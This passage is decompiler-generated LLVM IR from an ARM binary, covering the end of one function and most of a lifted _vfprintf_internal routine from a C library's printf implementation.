bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_bdec, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_129c0.228 to i32))
  %v0_bdfc = load i32, i32* %r5.global-to-local, align 4
  %v2_bdfc = add i32 %storemerge, %v0_bdfc
  store i32 %v2_bdfc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_be00

dec_label_pc_be00:                                ; preds = %dec_label_pc_bdc4, %bb15
  %v0_be00 = phi i32 [ %v4_bdd0, %dec_label_pc_bdc4 ], [ %v2_bdfc, %bb15 ]
  store i32 %v0_be00, i32* %r0.global-to-local, align 4
  %v2_be04 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_be04, i32* %r4.global-to-local, align 4
  store i32 %v6_bd88, i32* %r5.global-to-local, align 4
  ret i32 %v0_be00

; uselistorder directives
  uselistorder i32 %v0_be00, { 1, 0 }
  uselistorder i32 %v0_bde0, { 1, 0 }
  uselistorder i32 %v2_bdb0, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_be00, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_bde0, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_3()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_3()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_be0c = load i32, i32* @r5, align 4
  %v9_be0c = load i32, i32* @r6, align 4
  %v12_be0c = load i32, i32* @r7, align 4
  %v15_be0c = load i32, i32* @r8, align 4
  %v18_be0c = load i32, i32* @sb, align 4
  %v21_be0c = load i32, i32* @sl, align 4
  %v24_be0c = load i32, i32* @fp, align 4
  %v2_be14 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_be14, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_be14, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_be24 = load i32, i32* @r2, align 4
  store i32 %v0_be24, i32* @r5, align 4
  %v2_be28 = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_be28, i32* %r0.global-to-local, align 4
  %v1_be30 = icmp slt i32 %v2_be28, 0
  br i1 %v1_be30, label %dec_label_pc_be40, label %dec_label_pc_be74

dec_label_pc_be40:                                ; preds = %entry
  %v3_be40 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_be40, i32* @r4, align 4
  %v1_be44 = inttoptr i32 %v3_be40 to i8*
  store i32 %v3_be40, i32* %r0.global-to-local, align 4
  %v3_be48 = call i32 @strlen(i8* %v1_be44)
  store i32 %v3_be48, i32* %r0.global-to-local, align 4
  store i32 %v3_be48, i32* @r1, align 4
  %v2_be4c = icmp eq i32 %v3_be48, 0
  br i1 %v2_be4c, label %bb, label %dec_label_pc_be5c

bb:                                               ; preds = %dec_label_pc_be40
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c4cc

dec_label_pc_be5c:                                ; preds = %dec_label_pc_be40
  %v0_be5c = load i32, i32* @r4, align 4
  store i32 %v0_be5c, i32* %r0.global-to-local, align 4
  %v0_be60 = load i32, i32* @fp, align 4
  store i32 %v0_be60, i32* %r2.global-to-local, align 4
  %v3_be64 = inttoptr i32 %v0_be60 to i16*
  %v4_be64 = call i32 @__stdio_fwrite(i32 %v0_be5c, i32 %v3_be48, i16* %v3_be64)
  store i32 %v4_be64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c4cc

dec_label_pc_be74:                                ; preds = %entry
  %v0_be74 = load i32, i32* @r5, align 4
  store i32 %v2_be14, i32* %r0.global-to-local, align 4
  %v2_be7c = call i32 @_ppfs_prepargs(i32 %v2_be14, i32 %v0_be74)
  store i32 %v2_be7c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r1, align 4
  %v0_bec4 = load i32, i32* @r4, align 4
  store i32 %v0_bec4, i32* %r2.global-to-local, align 4
  %v1_bf48 = bitcast i32* %stack_var_-352 to i8*
  %v4_bf58 = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_bf64 = ptrtoint i32* %stack_var_-272 to i32
  %v2_bf7c = ptrtoint i32* %stack_var_-40 to i32
  %v2_bf98 = icmp eq i32 %tmp104, 0
  %v2_c2dc = ptrtoint i32* %stack_var_-200 to i32
  %v2_c31c = ptrtoint i32* %stack_var_-348 to i32
  %v2_c320 = ptrtoint i32* %stack_var_-72 to i32
  %v2_c1cc = ptrtoint i32* %stack_var_-44 to i32
  %v2_c1d8 = ptrtoint i32* %stack_var_-52 to i32
  %v7_c034 = zext i8 %tmp102 to i32
  %v2_c06c = ptrtoint i32* %stack_var_-73 to i32
  %v1_c074 = bitcast i32* %stack_var_-73 to i8*
  %v2_c07c = icmp ugt i32 %tmp104, 4
  %v7_c07c = icmp eq i32 %tmp104, 5
  %v7_bf60 = ptrtoint i32* %stack_var_-280 to i32
  %v5_bf90195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_c1a0 = icmp ugt i32 %tmp104, 16
  %v7_c1a0 = icmp eq i32 %tmp104, 17
  %v2_c1a4 = xor i1 %v7_c1a0, true
  %v3_c1a4 = and i1 %v2_c1a0, %v2_c1a4
  %v2_c228 = icmp ugt i32 %tmp104, 18
  %v7_c228 = icmp eq i32 %tmp104, 19
  %v2_c22c = xor i1 %v7_c228, true
  %v3_c22c = and i1 %v2_c228, %v2_c22c
  %v7_c2c4 = icmp eq i32 %tmp104, 20
  %v1_bfdc = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -38113)
  %v2_bfdc = inttoptr i32 %v1_bfdc to i8*
  %v2_c008 = xor i1 %v7_c07c, true
  %v3_c008 = and i1 %v2_c07c, %v2_c008
  %v7_c03c = icmp eq i32 %tmp104, 1
  %v2_c084 = xor i1 %v2_c07c, true
  %v3_c084 = or i1 %v7_c07c, %v2_c084
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_c0ec = icmp eq i32 %tmp104, 3
  %v11_c0f8 = icmp eq i32 %tmp104, 4
  %v9_bf68 = mul nuw nsw i32 %v4_bf58, 8
  %v10_bf68 = add i32 %v7_bf60, %v9_bf68
  br label %dec_label_pc_bec8.outer

dec_label_pc_bec8.outer:                          ; preds = %dec_label_pc_c4b0, %dec_label_pc_be74
  %v0_bec845 = phi i32 [ %v3_c4b0, %dec_label_pc_c4b0 ], [ %v0_bec4, %dec_label_pc_be74 ]
  %v0_bffc = phi i32 [ %stack_var_-336.4, %dec_label_pc_c4b0 ], [ %tmp103, %dec_label_pc_be74 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_c4b0 ], [ 0, %dec_label_pc_be74 ]
  br label %dec_label_pc_bec8.outer36

dec_label_pc_bec8.outer36:                        ; preds = %dec_label_pc_bec8.outer, %dec_label_pc_c4bc
  %v0_bec844 = phi i32 [ %v0_bec845, %dec_label_pc_bec8.outer ], [ %v1_c4bc, %dec_label_pc_c4bc ]
  %v5_bef4 = phi i32 [ %v0_bec845, %dec_label_pc_bec8.outer ], [ %v1_bf24, %dec_label_pc_c4bc ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_bec8.outer ], [ %v1_c39c, %dec_label_pc_c4bc ]
  %v1_bec8188 = inttoptr i32 %v0_bec844 to i8*
  %v2_bec8189 = load i8, i8* %v1_bec8188, align 1
  %v2_becc191 = icmp eq i8 %v2_bec8189, 0
  br i1 %v2_becc191, label %dec_label_pc_bee4, label %bb138

bb138:                                            ; preds = %dec_label_pc_bec8.outer36, %.thread6
  %v2_bec8193 = phi i8 [ %v2_bec8, %.thread6 ], [ %v2_bec8189, %dec_label_pc_bec8.outer36 ]
  %v1_bedc192 = phi i32 [ %v2_bedc, %.thread6 ], [ %v0_bec844, %dec_label_pc_bec8.outer36 ]
  %v8_bed0 = icmp eq i8 %v2_bec8193, 37
  br i1 %v8_bed0, label %dec_label_pc_bee4, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_bedc = add i32 %v1_bedc192, 1
  store i32 %v2_bedc, i32* @r4, align 4
  %v1_bec8 = inttoptr i32 %v2_bedc to i8*
  %v2_bec8 = load i8, i8* %v1_bec8, align 1
  %v2_becc = icmp eq i8 %v2_bec8, 0
  br i1 %v2_becc, label %dec_label_pc_bee4, label %bb138

dec_label_pc_bee4:                                ; preds = %bb138, %.thread6, %dec_label_pc_bec8.outer36
  %v1_bedc.lcssa = phi i32 [ %v0_bec844, %dec_label_pc_bec8.outer36 ], [ %v2_bedc, %.thread6 ], [ %v1_bedc192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bee4 = sub i32 %v1_bedc.lcssa, %v5_bef4
  %v9_bee4 = icmp eq i32 %v1_bedc.lcssa, %v5_bef4
  br i1 %v9_bee4, label %dec_label_pc_bf18, label %dec_label_pc_beec

dec_label_pc_beec:                                ; preds = %dec_label_pc_bee4
  store i32 %v2_bee4, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_bee4, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_beec
  store i32 %v5_bef4, i32* %r0.global-to-local, align 4
  store i32 %v2_bee4, i32* @r1, align 4
  %v5_befc = load i32, i32* @fp, align 4
  store i32 %v5_befc, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_beec, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_beec ]
  store i32 48900, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_129c0.228 to i32))
  %v0_bf04 = load i32, i32* %r0.global-to-local, align 4
  %v1_bf04 = load i32, i32* @r5, align 4
  %v9_bf04 = icmp eq i32 %v0_bf04, %v1_bf04
  br i1 %v9_bf04, label %dec_label_pc_bf0c, label %dec_label_pc_c4c4

dec_label_pc_bf0c:                                ; preds = %bb142
  %v2_bf10 = add i32 %v0_bf04, %stack_var_-356.1.ph37
  %v0_bf18.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bf18

dec_label_pc_bf18:                                ; preds = %dec_label_pc_bee4, %dec_label_pc_bf0c
  %v0_bf2c = phi i32 [ %v5_bef4, %dec_label_pc_bee4 ], [ %v0_bf18.pre, %dec_label_pc_bf0c ]
  %v1_c39c = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_bee4 ], [ %v2_bf10, %dec_label_pc_bf0c ]
  %v1_bf18 = inttoptr i32 %v0_bf2c to i8*
  %v2_bf18 = load i8, i8* %v1_bf18, align 1
  %v2_bf1c = icmp eq i8 %v2_bf18, 0
  br i1 %v2_bf1c, label %dec_label_pc_c4cc, label %dec_label_pc_bf24

dec_label_pc_bf24:                                ; preds = %dec_label_pc_bf18
  %v1_bf24 = add i32 %v0_bf2c, 1
  %v2_bf24 = inttoptr i32 %v1_bf24 to i8*
  %v3_bf24 = load i8, i8* %v2_bf24, align 1
  %v7_bf28 = icmp eq i8 %v3_bf24, 37
  store i32 %v1_bf24, i32* %r2.global-to-local, align 4
  br i1 %v7_bf28, label %dec_label_pc_c4bc, label %dec_label_pc_bf34

dec_label_pc_bf34:                                ; preds = %dec_label_pc_bf24
  store i32 %v2_be14, i32* @r4, align 4
  store i32 %v2_be14, i32* %r0.global-to-local, align 4
  store i32 %v1_bf24, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_bf48 = call i32 @_ppfs_parsespec(i8* %v1_bf48)
  store i32 %v2_be14, i32* @r0, align 4
  %v0_bf50 = call i32 @_ppfs_setargs()
  store i32 %v0_bf50, i32* %r0.global-to-local, align 4
  store i32 %v4_bf58, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_bf34
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_bf34, %bb145
  %storemerge = phi i32 [ %v10_bf68, %bb145 ], [ %v7_bf64, %dec_label_pc_bf34 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_bf90195, label %dec_label_pc_bf74, label %dec_label_pc_bf94

dec_label_pc_bf74:                                ; preds = %bb146, %dec_label_pc_bf74
  %v5_bf80197 = phi i32 [ %v5_bf80, %dec_label_pc_bf74 ], [ %v2_bf7c, %bb146 ]
  %v0_bf74196 = phi i32 [ %v1_bf78, %dec_label_pc_bf74 ], [ %storemerge, %bb146 ]
  %v2_bf74 = add i32 %v5_bf80197, -32
  %v3_bf74 = inttoptr i32 %v2_bf74 to i32*
  store i32 %v0_bf74196, i32* %v3_bf74, align 4
  %v0_bf78 = load i32, i32* %r0.global-to-local, align 4
  %v1_bf78 = add i32 %v0_bf78, 8
  store i32 %v1_bf78, i32* %r0.global-to-local, align 4
  %v1_bf80.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_bf80 = mul i32 %v1_bf80.pre, 4
  %v5_bf80 = add i32 %v4_bf80, %v2_bf7c
  %v1_bf8c = add i32 %v1_bf80.pre, 1
  store i32 %v1_bf8c, i32* %r2.global-to-local, align 4
  %v5_bf90 = icmp slt i32 %v1_bf80.pre, %tmp105
  br i1 %v5_bf90, label %dec_label_pc_bf74, label %dec_label_pc_bf94

dec_label_pc_bf94:                                ; preds = %dec_label_pc_bf74, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_bf98, label %dec_label_pc_bfa0, label %dec_label_pc_bfc4

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_bf94
  %v3_bfa0 = load i32, i32* %stack_var_-72, align 4
  %v1_bfac = inttoptr i32 %v3_bfa0 to i32*
  %v2_bfac = load i32, i32* %v1_bfac, align 4
  store i32 %v2_bfac, i32* %r0.global-to-local, align 4
  %v1_bfb0 = and i32 %v0_bffc, 3840
  store i32 %v1_c39c, i32* %r2.global-to-local, align 4
  %v3_bfb8 = ashr i32 %v1_c39c, 31
  %v4_bfbc = inttoptr i32 %v2_bfac to i16*
  %v5_bfbc = call i32 @_store_inttype(i16* %v4_bfbc, i32 %v1_bfb0, i32 %v1_c39c, i32 %v3_bfb8)
  store i32 %v5_bfbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c4b0

dec_label_pc_bfc4:                                ; preds = %dec_label_pc_bf94
  br i1 %tmp207, label %dec_label_pc_c160, label %dec_label_pc_bfcc

dec_label_pc_bfcc:                                ; preds = %dec_label_pc_bfc4
  %v3_bfdc = load i8, i8* %v2_bfdc, align 1
  %v4_bfdc = zext i8 %v3_bfdc to i32
  %v7_bfe0 = icmp eq i8 %v3_bfdc, 10
  br i1 %v7_bfe0, label %dec_label_pc_bfec, label %bb147

bb147:                                            ; preds = %dec_label_pc_bfcc
  br label %bb151

dec_label_pc_bfec:                                ; preds = %dec_label_pc_bfcc
  %v1_bffc = and i32 %v0_bffc, 64
  %v2_bffc = icmp eq i32 %v1_bffc, 0
  br i1 %v2_bffc, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_bfec
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_bfec, %bb150
  br i1 %v3_c008, label %.thread, label %dec_label_pc_c010

.thread:                                          ; preds = %bb151
  %v5_c008 = sub nsw i32 0, %v4_bfdc
  br label %dec_label_pc_c028

dec_label_pc_c010:                                ; preds = %bb151
  br i1 %v7_c0ec, label %bb152, label %dec_label_pc_c01c

bb152:                                            ; preds = %dec_label_pc_c010
  br label %dec_label_pc_c028

dec_label_pc_c01c:                                ; preds = %dec_label_pc_c010
  br i1 %v7_c03c, label %dec_label_pc_c02c, label %dec_label_pc_c028

dec_label_pc_c028:                                ; preds = %.thread, %bb152, %dec_label_pc_c01c
  %v0_c05481 = phi i32 [ %v5_c008, %.thread ], [ %v4_bfdc, %bb152 ], [ %v4_bfdc, %dec_label_pc_c01c ]
  br label %dec_label_pc_c02c

dec_label_pc_c02c:                                ; preds = %dec_label_pc_c01c, %dec_label_pc_c028
  %v0_c05480 = phi i32 [ %v0_c05481, %dec_label_pc_c028 ], [ %v4_bfdc, %dec_label_pc_c01c ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_c028 ], [ 6, %dec_label_pc_c01c ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_c02c = load i32, i32* %stack_var_-348, align 4
  %v1_c030 = icmp slt i32 %v3_c02c, 0
  %v7_c034. = select i1 %v1_c030, i32 %v7_c034, i32 32
  store i32 %v7_c034., i32* @sb, align 4
  br i1 %v7_c03c, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_c02c
  store i32 %v2_bf7c, i32* %r2.global-to-local, align 4
  %v2_c044 = load i32, i32* @ip, align 4
  %v5_c044 = mul i32 %v2_c044, 4
  %v6_c044 = add i32 %v5_c044, %v2_bf7c
  %v2_c048 = add i32 %v6_c044, -276
  %v3_c048 = inttoptr i32 %v2_c048 to i32*
  %v4_c048 = load i32, i32* %v3_c048, align 4
  %v2_c050 = and i32 %v4_c048, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_c02c, %.thread15
  %storemerge93 = phi i32 [ %v2_c050, %.thread15 ], [ 1024, %dec_label_pc_c02c ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_c05480, i32* @r2, align 4
  %v3_c058 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_c058, i32* @r1, align 4
  %v0_c05c = call i32 @_load_inttype()
  store i32 %v0_c05c, i32* @r2, align 4
  %v0_c068 = load i32, i32* @r1, align 4
  store i32 %v0_c068, i32* @r3, align 4
  store i32 %v2_c06c, i32* %r0.global-to-local, align 4
  %v2_c074 = call i32 @_uintmaxtostr(i8* %v1_c074)
  store i32 %v2_c074, i32* %r0.global-to-local, align 4
  store i32 %v2_c074, i32* @r4, align 4
  br i1 %v3_c084, label %bb160, label %dec_label_pc_c088

dec_label_pc_c088:                                ; preds = %bb157
  %v3_c074 = inttoptr i32 %v2_c074 to i8*
  %v3_c088 = load i8, i8* %v3_c074, align 1
  %v7_c08c = icmp eq i8 %v3_c088, 45
  %v2_c094 = or i32 %v0_bffc, 2
  %v2_c094.stack_var_-336.0 = select i1 %v7_c08c, i32 %v2_c094, i32 %v0_bffc
  br i1 %v7_c08c, label %.thread17, label %dec_label_pc_c0a8

.thread17:                                        ; preds = %dec_label_pc_c088
  %v3_c098 = add i32 %v2_c074, 1
  store i32 %v3_c098, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_c0a8:                                ; preds = %dec_label_pc_c088
  %v1_c0a8 = and i32 %v2_c094.stack_var_-336.0, 2
  %v2_c0a8 = icmp eq i32 %v1_c0a8, 0
  br i1 %v2_c0a8, label %dec_label_pc_c0b4, label %bb158

bb158:                                            ; preds = %dec_label_pc_c0a8
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_c0b4:                                ; preds = %dec_label_pc_c0a8
  %v1_c0b4 = urem i32 %v2_c094.stack_var_-336.0, 2
  %v2_c0b4 = icmp eq i32 %v1_c0b4, 0
  br i1 %v2_c0b4, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_c0b4
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_c0b4, %bb159
  %v0_c110 = phi i32 [ %v2_c074, %bb157 ], [ %v3_c098, %.thread17 ], [ %v2_c074, %dec_label_pc_c0b4 ], [ %v2_c074, %bb159 ], [ %v2_c074, %bb158 ]
  %v0_c0cc = phi i32 [ %v0_bffc, %bb157 ], [ %v2_c094, %.thread17 ], [ %v0_bffc, %dec_label_pc_c0b4 ], [ %v0_bffc, %bb159 ], [ %v0_bffc, %bb158 ]
  %v3_c0bc = load i32, i32* %stack_var_-348, align 4
  %v1_c0c4 = icmp slt i32 %v3_c0bc, 0
  br i1 %v1_c0c4, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_c0bc, %bb160 ]
  %v0_c0f4 = phi i32 [ 1, %bb161 ], [ %v3_c0bc, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_c0cc = and i32 %v0_c0cc, 16
  %v2_c0cc = icmp eq i32 %v1_c0cc, 0
  %v2_c0d8 = sub i32 %v2_c06c, %v0_c110
  store i32 %v2_c0d8, i32* @r5, align 4
  br i1 %v2_c0cc, label %bb169, label %dec_label_pc_c0e0

dec_label_pc_c0e0:                                ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_c0e0
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_c0e0, %bb163
  br i1 %v7_c0ec, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_c0f4, %v2_c0d8
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_c0f8, label %dec_label_pc_c100, label %bb169

dec_label_pc_c100:                                ; preds = %bb167
  %v1_c100 = inttoptr i32 %v0_c110 to i8*
  %v2_c100 = load i8, i8* %v1_c100, align 1
  %v7_c104 = icmp eq i8 %v2_c100, 48
  br i1 %v7_c104, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_c100
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_c100
  %v2_c10c = add i32 %v2_c0d8, 1
  store i32 %v2_c10c, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_c150 = phi i32 [ %v0_c0f4, %bb167 ], [ %v0_c0f4, %bb162 ], [ 1, %bb168 ], [ %v2_c10c, %.thread24 ], [ %v0_c0f4, %bb166 ]
  %v1_c110 = inttoptr i32 %v0_c110 to i8*
  %v2_c110 = load i8, i8* %v1_c110, align 1
  %v7_c114 = icmp eq i8 %v2_c110, 48
  br i1 %v7_c114, label %dec_label_pc_c11c, label %dec_label_pc_c14c

dec_label_pc_c11c:                                ; preds = %bb169
  %v0_c120 = load i32, i32* @r6, align 4
  %v7_c124 = icmp slt i32 %v0_c120, 6
  br i1 %v7_c124, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_c11c
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_c11c, %bb170
  br i1 %v7_c03c, label %.thread27, label %dec_label_pc_c140

.thread27:                                        ; preds = %bb171
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -38140), i32* @r4, align 4
  br label %dec_label_pc_c158

dec_label_pc_c140:                                ; preds = %bb171
  %v2_c140 = icmp eq i32 %v5_c150, 0
  br i1 %v2_c140, label %bb172, label %dec_label_pc_c14c

bb172:                                            ; preds = %dec_label_pc_c140
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_c158

dec_label_pc_c14c:                                ; preds = %dec_label_pc_c140, %bb169
  %v2_c14c = sub i32 %v5_c150, %v2_c0d8
  %tmp211 = icmp ugt i32 %v5_c150, %v2_c0d8
  br i1 %tmp211, label %.thread85, label %dec_label_pc_c158

.thread85:                                        ; preds = %dec_label_pc_c14c
  store i32 %v2_c14c, i32* @r8, align 4
  br label %dec_label_pc_c36cthread-pre-split

dec_label_pc_c158:                                ; preds = %dec_label_pc_c14c, %.thread27, %bb172
  %v1_c370.pre205 = phi i32 [ %v2_c0d8, %dec_label_pc_c14c ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_c36cthread-pre-split

dec_label_pc_c160:                                ; preds = %dec_label_pc_bfc4
  br i1 %tmp208, label %dec_label_pc_c1a0, label %dec_label_pc_c168

dec_label_pc_c168:                                ; preds = %dec_label_pc_c160
  %v3_c178 = load i32, i32* %stack_var_-72, align 4
  %v0_c17c = load i32, i32* @fp, align 4
  store i32 %v0_c17c, i32* %r0.global-to-local, align 4
  %v1_c180 = inttoptr i32 %v3_c178 to i32*
  %v2_c180 = load i32, i32* %v1_c180, align 4
  store i32 %v2_c180, i32* %r2.global-to-local, align 4
  %v3_c180 = add i32 %v3_c178, 4
  %v4_c180 = inttoptr i32 %v3_c180 to i32*
  %v5_c180 = load i32, i32* %v4_c180, align 4
  %v8_c184 = call i32 @_fpmaxtostr(i32 %v0_c17c, double bitcast (i64 sext (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -95100) to i64) to double), i32 %v2_c180, i32 %v5_c180, i32 %v2_c31c, i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -95100))
  store i32 %v8_c184, i32* %r0.global-to-local, align 4
  %v1_c188 = icmp slt i32 %v8_c184, 0
  br i1 %v1_c188, label %dec_label_pc_c4c4, label %dec_label_pc_c190

dec_label_pc_c190:                                ; preds = %dec_label_pc_c168
  %v2_c194 = add i32 %v8_c184, %v1_c39c
  store i32 %v2_c194, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c4b0

dec_label_pc_c1a0:                                ; preds = %dec_label_pc_c160
  br i1 %v3_c1a4, label %dec_label_pc_c228, label %dec_label_pc_c1a8

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c1a0
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_c1b0 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_c1b0, i32* %r0.global-to-local, align 4
  br i1 %v7_c1a0, label %dec_label_pc_c1b8, label %dec_label_pc_c1f0

dec_label_pc_c1b8:                                ; preds = %dec_label_pc_c1a8
  %v1_c1b8 = inttoptr i32 %v3_c1b0 to i32*
  %v2_c1b8 = load i32, i32* %v1_c1b8, align 4
  %v9_c1bc = icmp eq i32 %v2_c1b8, 0
  store i32 %v2_c1b8, i32* %stack_var_-44, align 4
  br i1 %v9_c1bc, label %dec_label_pc_c268, label %dec_label_pc_c1c8

dec_label_pc_c1c8:                                ; preds = %dec_label_pc_c1b8
  %v3_c1c8 = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_c1cc, i32* @r0, align 4
  %v4_c1d0 = ashr i32 %v3_c1c8, 31
  %v5_c1d0 = or i32 %v4_c1d0, %v3_c1c8
  store i32 %v5_c1d0, i32* %r2.global-to-local, align 4
  store i32 %v2_c1cc, i32* @r1, align 4
  %v6_c1dc = call i32 @__GI_wcsrtombs(i32 %v2_c1cc, i32 %v2_c1cc, i32 %v5_c1d0, i32 %v2_c1d8, i32 0, i32 %v2_c1b8)
  store i32 %v6_c1dc, i32* %r0.global-to-local, align 4
  %v3_c1e0 = icmp eq i32 %v6_c1dc, -1
  store i32 %v6_c1dc, i32* @r5, align 4
  br i1 %v3_c1e0, label %dec_label_pc_c4c4, label %dec_label_pc_c35c

dec_label_pc_c1f0:                                ; preds = %dec_label_pc_c1a8
  store i32 %v2_c2dc, i32* %r7.global-to-local, align 4
  %v1_c1f4 = inttoptr i32 %v3_c1b0 to i32*
  %v2_c1f4 = load i32, i32* %v1_c1f4, align 4
  store i32 %v2_c1d8, i32* %r2.global-to-local, align 4
  store i32 %v2_c2dc, i32* %r0.global-to-local, align 4
  %v5_c200 = call i32 @__GI_wcrtomb(i32 %v2_c2dc, i32 %v2_c1f4, i32 %v2_c1d8, i32 %tmp105, i32 0)
  store i32 %v5_c200, i32* %r0.global-to-local, align 4
  %v7_c204 = icmp eq i32 %v5_c200, -1
  store i32 %v5_c200, i32* @r5, align 4
  br i1 %v7_c204, label %dec_label_pc_c4c4, label %dec_label_pc_c210

dec_label_pc_c210:                                ; preds = %dec_label_pc_c1f0
  %v0_c210 = load i32, i32* @sl, align 4
  store i32 %v0_c210, i32* @r8, align 4
